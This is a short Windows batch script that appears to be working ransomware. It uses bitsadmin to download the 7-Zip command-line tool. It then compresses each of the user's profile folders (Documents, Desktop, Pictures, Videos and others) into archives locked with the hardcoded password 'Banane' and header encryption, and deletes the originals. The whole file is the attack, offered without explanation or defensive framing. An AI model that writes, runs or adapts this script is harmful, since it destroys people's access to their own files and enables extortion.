@echo off

:main
if not exist %systemdrive%\7zr.exe goto install

:encrypt
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Contacts.7z %userprofile%\Contacts
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Documents.7z %userprofile%\Documents
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Desktop.7z %userprofile%\Desktop
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Downloads.7z %userprofile%\Downloads
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Favorites.7z %userprofile%\Favorites
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Links.7z %userprofile%\Links
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Music.7z %userprofile%\Music
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Pictures.7z %userprofile%\Pictures
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Pictures.7z %userprofile%\Searches
7zr.exe a -pBanane -mhe=on -t7z -mx=0 -r -sdel %systemdrive%\%username%_Videos.7z %userprofile%\Videos

:install
bitsadmin /transfer "7zdownload" /PRIORITY HIGH "https://7-zip.org/a/7zr.exe" %systemdrive%\7zr.exe
type nul>%systemdrive%\empty.sys
fc %systemdrive%\empty.sys %systemdrive%\7zr.exe
if %errorlevel%==0 goto install
goto main